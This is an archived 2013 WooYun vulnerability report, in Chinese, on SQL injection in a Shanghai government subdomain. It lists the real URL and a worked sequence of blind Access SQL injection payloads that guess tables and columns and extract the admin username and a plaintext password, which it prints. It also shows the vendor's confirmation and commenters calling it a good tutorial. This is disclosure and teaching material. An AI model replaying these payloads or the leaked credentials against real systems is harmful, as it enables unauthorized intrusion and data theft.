{"id": 11669, "wybug_id": "wooyun-2013-024186", "wybug_title": "上海出入境某分站SQL注入之手工注入", "wybug_corp": "上海出入境", "wybug_author": "路人甲", "wybug_date": "2013-05-22 14:52", "wybug_open_date": "2013-07-06 14:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "手工注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-06：\t细节向公众公开  简要描述： 上海出入境某分站SQL注入。and 1=1正常，and 1=2出错。小菜第一次发，求个马，也不懂是否需要在url上遮盖。如有必须，请帮忙遮盖。3Q~ 详细说明：  http://yangshan.shciq.gov.cn/article.aspx?artid=622 and 1=1 正常http://yangshan.shciq.gov.cn/article.aspx?artid=622 and 1=2 不正常则确定为注入点   漏洞证明：  接下来用工具跑。跑不出来撒，穿山甲，havij等。Sqlmap跑也总是说连接超时\n\n（后来知道是啥问题了，又用sqlmap，还是能跑出来的）于是只好先手工试试了。http://yangshan.shciq.gov.cn/article.aspx?artid=622 order by 7 是正常的aspx的站，数据库要么是sqlserver，要么是access的吧http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(*) from sysobjects)>0http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(*) from msysobjects)>0第一个URL判断是否是sqlserver数据库，看是否有sysobjects这个表。所以可以判断数据库是access的。接下来判断admin表是否存在http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(*) from admin)>=0\n\n存在admin表。接下来把count(*)替换成count(字段名)，用同样的原理进行猜解。http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(username) from admin)>=0http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select count(password) from admin)>=0这里运气好啊，字段就是username和password，当然可能还有其他字段。猜字段这里就只能凭经验了，还有一种方法就是去后台登录那里，看源代码，看里面出现的可能是字段名的关键字。\n\n接下来就是猜字段的值http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 len(username) from admin)>0原理么就是如果top 1的username长度大于0，则条件成立。我们接着就>1,>2的测下去。一直到>5不成立，则我们就知道username的长度是5在的到username的长度之后，用mid(username,N,1)截取第N位字符，再 asc(mid(username,N,1)) 得到 ASCII 码http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,1,1)) from admin)>96  对http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,1,1)) from admin)>97  错http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,2,1)) from admin)>99  对http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(username,2,1)) from admin)>100 错接下来and (select top 1 asc(mid(username,3,1)) from admin)>108 对and (select top 1 asc(mid(username,3,1)) from admin)>109 错and (select top 1 asc(mid(username,4,1)) from admin)>104 对 and (select top 1 asc(mid(username,4,1)) from admin)>105 错and (select top 1 asc(mid(username,5,1)) from admin)>109 对and (select top 1 asc(mid(username,5,1)) from admin)>110 错得到username的值为admin，接下来password的方法也是一样。http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 len(password) from admin)>5 错误，得到password的密码也是5位，以为是admin，去试了下结果不是。然后就是以上同样方法得到password的密码，5位是明文。http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(password,1,1)) from admin)>101 对http://yangshan.shciq.gov.cn/article.aspx?artid=622 and (select top 1 asc(mid(password,1,1)) from admin)>102 错…..以此类推最后得到密码为f2wa3最后登进后台。之后操作未进行。\n\n   修复方案：  SQL注入嘛，还是大牛知道怎么补，或者前面可以挂个WAF哦~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2013-05-25 21:24 厂商回复： CNVD确认并复现SQL注入情况（用某工具也可以自动注出），已在23日下午转由CNCERT下发上海分中心，由其后续协调网站管理部门处置。按部分影响机密性、完整性、可用性进行评分，rank=7.48*1.0*1.4=10.472 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-06 15:31 |    \t\tn3wF \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        )\t\t \n  =.=可以做教程了    \n     2013-07-06 18:05 |    \t\t無情 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 根据相关法律法规和政策，此信息未予显示。)\t\t \n  这个教程不错。。    \n     2014-07-26 09:27 |    \t\tTixe \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  教程好    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}